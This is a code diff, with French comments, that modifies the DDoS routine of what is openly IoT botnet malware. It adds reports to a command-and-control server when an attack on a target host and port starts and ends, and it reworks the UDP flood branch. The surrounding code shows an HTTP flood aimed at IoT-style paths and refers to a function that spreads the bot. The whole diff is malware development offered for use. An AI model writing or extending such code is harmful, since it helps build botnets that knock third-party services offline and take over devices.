@@ -204,6 +204,11 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         small_packet[i] = rand() % 256;
     }
     
+    // Informer le serveur C2 du début de l'attaque
+    char message[BUFFER_SIZE];
+    snprintf(message, sizeof(message), "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
+    send(c2_socket, message, strlen(message), 0);
+    
     if (strcmp(method, "http") == 0) {
         // Attaque HTTP optimisée pour IoT
         char *paths[] = {"/", "/index.php", "/home", "/api", "/login"};
@@ -311,11 +316,14 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
             }
             usleep(15000); // 15ms délai
         }
-    }else if (strcmp(method, "udp") == 0) {
-            udp_flood(target, port, duration);
-        }
-        exit(0);
     }
+    else if (strcmp(method, "udp") == 0) {
+        udp_flood(target, port, duration);
+    }
+    
+    // Informer le serveur C2 de la fin de l'attaque
+    snprintf(message, sizeof(message), "DDOS_COMPLETED|%s:%d|%s", target, port, method);
+    send(c2_socket, message, strlen(message), 0);
 }
 
 // Fonction pour propager le bot
